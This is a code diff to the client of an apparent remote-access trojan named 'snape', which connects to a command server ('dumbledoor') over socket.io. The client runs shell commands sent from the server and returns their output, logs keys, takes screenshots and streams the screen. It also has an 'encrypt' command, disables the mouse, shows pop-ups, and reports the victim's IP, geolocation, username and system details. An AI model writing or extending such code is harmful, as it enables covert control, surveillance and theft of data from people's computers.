@@ -2,10 +2,12 @@ import socketio
 import atexit
 from time import sleep
 import os
+import getpass
 import pytz
 import tkinter as tk
 import urllib
 import requests
+import win32gui
 import codecs
 try:
   import win32gui
@@ -45,10 +47,6 @@ mouse_input_enabled = True
 STORAGE_SERVER = 'https://storageserver.posydon.repl.co'
 MAIN_SERVER = 'https://dumbledoor.posydon.repl.co'
 TOKEN = 'f056c72b2110f7'
-try:
-  mouse_controller = Controller() # starting mouse controller
-except:
-  pass
 
 sio = socketio.Client() #conecting to server
 sio.connect(MAIN_SERVER, wait_timeout = 10)
@@ -56,13 +54,15 @@ sio.connect(MAIN_SERVER, wait_timeout = 10)
 #reading file with snape client identification
 try:
   with open('id.txt', 'r') as file:
-    id = file.read()
+    snape_id = file.read()
 except:
   with open('id.txt', 'w') as file:
     id_temp = ''
     for i in range(0, 10):
-      id_temp+=str(random.randint(0, 9)+";")
+      id_temp+=str(random.randint(0, 9))+";"
+      
     file.write(id_temp)
+    snape_id = id_temp
   file.close()
 
 #start socketio client event handlers:
@@ -80,19 +80,19 @@ def on_my_response(data):
 #handler for shell commands
 @sio.on('shell')
 def shell(data):
-  if data['id'] == id:
+  if data['id'] == snape_id:
     try:
       output = subprocess.check_output(data['command'], shell=True)
       output_str = output.decode('utf-8')
-      sio.emit('response', data={'output': output_str, 'command': data['command'], 'id': id})
+      sio.emit('response', data={'output': output_str, 'command': data['command'], 'id': snape_id, 'api': str(data['api'])})
     except Exception as e:
-      sio.emit('response', data={'output': str(e)+"\n'Bad Dobby! Bad Dobby!'", 'command': data['command'], 'id': id}) 
+      sio.emit('response', data={'output': str(e)+"\n'Bad Dobby! Bad Dobby!'", 'command': data['command'], 'id': snape_id, 'api': str(data['api'])}) 
 
 #handler for curses
 @sio.on('command')
 def command(data):
   print(data)
-  if data['id'] == id:
+  if data['id'] == snape_id:
     command = data['command']
     try:
       param1 = data['param1']
@@ -110,17 +110,18 @@ def command(data):
       param4 = data['param4']
     except:
       param4 = None
+    api = data['api']
+      
     for i in range(0, int(data['repeat'])):
-      execution_thread = threading.Thread(target=execute, args=[command, param1, param2, param3, param4], daemon=True)
+      execution_thread = threading.Thread(target=execute, args=[command, param1, param2, param3, param4, api], daemon=True)
       execution_thread.start()
 
 #End socketio event client handlers, start curse sorting and execution
-def execute(command, param1, param2, param3, param4):
-  global listener
+def execute(command, param1, param2, param3, param4, api):
   match command:
     case 'msgbox':
-      dobby69(command)
-      msg(param1, param2, param3)
+      dobby69(command, api)
+      msg(param1, param2, param3, api)
       
     case 'encrypt':
       if param1 == 'current':
@@ -135,21 +136,20 @@ def execute(command, param1, param2, param3, param4):
       screenshot()
 
     case 'sound':
-      print('sound selected')
       play_sound()
 
     case 'dio':
-      dobby69(command)
-      diologue_top(param1, param2)
+      dobby69(command, api)
+      diologue_top(param1, param2, api)
 
     case 'keyboard-write':
       keyboard_write(param1)
     
-    case 'keyboard_send':
+    case 'keyboard-send':
       keyboard_send(param1)
 
-    case 'keyboard_message':
-      print(param1, param2, param3, param4)
+    case 'keyboard-message':
+      print('message')
       write_message(text=param1, delay=param2, save=eval(param3), name=param4)
 
     case 'mouse_disable':
@@ -173,12 +173,12 @@ def execute(command, param1, param2, param3, param4):
 def send_log(data):
   sio.emit('log', data={'content': data})
 
-def dobby69(command): #arbitrary time response warning (dobby 69 response code)
-  sio.emit('response', data={'output': 'dobby 69', 'command': command, 'id': id})
+def dobby69(command, api): #arbitrary time response warning (dobby 69 response code)
+  sio.emit('response', data={'output': 'dobby 69', 'command': command, 'id': snape_id, 'api': str(api)})
 #for sending data that will be delivered speedily
 #and does not risk disrupting dumbledoor terminal
-def respond(data):
-  sio.emit('response', data={'output': data})
+def respond(data, api):
+  sio.emit('response', data={'output': data, 'api': str(api)})
 
 #End communication functions, start main curse function definitions:
 def url_open(url):
@@ -199,9 +199,9 @@ def play_sound():
   if response.status_code == 200:
       with open('file.mp3', 'wb') as f:
           f.write(response.content)
-          send_log(f'{id}: File downloaded successfully')
+          send_log(f'{snape_id}: File downloaded successfully')
   else:
-      send_log(f'{id}: Failed to download file')
+      send_log(f'{snape_id}: Failed to download file')
   send_log(f"mp3 file played with exit code: {play_music('file.mp3')}")
   os.remove('file.mp3')
 
@@ -257,12 +257,16 @@ def start_screen_feed():
       # Wait for a short period of time before capturing the next screenshot
       time.sleep(0.1)
 
-def diologue_top(title, message):
+def diologue_top(title, message, api):
+  global snape_id
+  sio.emit('response', data={'output': 'dobby 69', 'id': snape_id, 'api': 'True'})
   root = tkinter.Tk()
   root.wm_attributes('-topmost', 1)
   root.withdraw()
   prompt = askstring(title, message, parent=root)
   send_log(f"user response: {prompt}")
+  output = f'\n\tmessage: {message}\n\ttitle:{title}\n\tresponse: {prompt}'
+  sio.emit('response', data={'output': output, 'id': snape_id, 'api': api})
   root.destroy()
 
 def keyboard_write(text):
@@ -285,11 +289,8 @@ def write_message(text, delay, save=False, name="README", editor="notepad"):
   else:
     pass
 
-
-
-
 def screenshot():
-  global id
+  global snape_id
   try:
     print('screenshot')
     screenshot = ImageGrab.grab()
@@ -301,8 +302,8 @@ def screenshot():
   except Exception as e:
     send_log(f'screenshot failed, with exception as follows: \n {e}')
 
-def msg(title, message, type):
-  global id
+def msg(title, message, type, api):
+  global snape_id
   try:
     root = tkinter.Tk()
     root.wm_attributes('-topmost', 1)
@@ -314,9 +315,9 @@ def msg(title, message, type):
     elif type == 'warning':
       tkm.showwarning(title, message, parent=root)
     root.destroy()
-    send_log(f"client {id} closed messagebox>[\n\ttype: {type}\n\ttitle: {title}\n\tmessage: {message}\n]")
+    send_log(f"client {snape_id} closed messagebox>[\n\ttype: {type}\n\ttitle: {title}\n\tmessage: {message}\n]")
   except Exception as e:
-    sio.emit('response', data={'output': f"error: {e}"})
+    sio.emit('response', data={'output': f"error: {e}", 'api': api})
 #keylogger functions: 
 
 def send_key(key):
@@ -341,7 +342,18 @@ def open_url(url):
   webbrowser.open(url, 2, True)
 #End main curse functions, start server check-in loop
 
+url = f'http://ipinfo.io/json?token={TOKEN}'
+response_ipinfo = eval(requests.get(url, headers = {'User-agent': f'snape@{snape_id}'}).text)
+ip = requests.get('https://api.ipify.org').content.decode('utf8')
+data = response_ipinfo
 
+city = data['city'].replace(' ', '_')
+country = data['country'].replace(' ', '_')
+region = data['region'].replace(' ', '_')
+longitude = data['loc'].split(',')[0]
+latitude = data['loc'].split(',')[1]
+postal = data['postal']
+timezone = data['timezone']
 while True:
   tz_NY = pytz.timezone('America/New_York')
   datetime_NY = datetime.now(tz_NY)
@@ -350,21 +362,9 @@ while True:
   system = platform.system()
   release = platform.release()
   version = platform.version()
-  
-  url = f'http://ipinfo.io/json?token={TOKEN}'
-  response_ipinfo = eval(requests.get(url, headers = {'User-agent': f'snape@{id}'}).text)
-  ip = requests.get('https://api.ipify.org').content.decode('utf8')
-  data = response_ipinfo
+  username = getpass.getuser()
 
-  city = data['city'].replace(' ', '_')
-  country = data['country'].replace(' ', '_')
-  region = data['region'].replace(' ', '_')
-  longitude = data['loc'].split(',')[0]
-  latitude = data['loc'].split(',')[1]
-  postal = data['postal']
-  timezone = data['timezone']
-  
-  data_dict = {'id':str(id), 'ip': str(ip), 'timezone': str(tz_NY), 'time': str(time), 'system': str(system), 'release': str(release), 'version': str(version), 'city': str(city), 'country': str(country), 'region': str(region), 'longitude': str(longitude), 'latitude': str(latitude), 'postal': str(postal)}
+  data_dict = {'id':str(snape_id), 'username': username, 'ip': str(ip), 'timezone': str(tz_NY), 'time': str(time), 'system': str(system), 'release': str(release), 'version': str(version), 'city': str(city), 'country': str(country), 'region': str(region), 'longitude': str(longitude), 'latitude': str(latitude), 'postal': str(postal)}
   try:
     sio.emit('check_in', data_dict)
     print('sent')
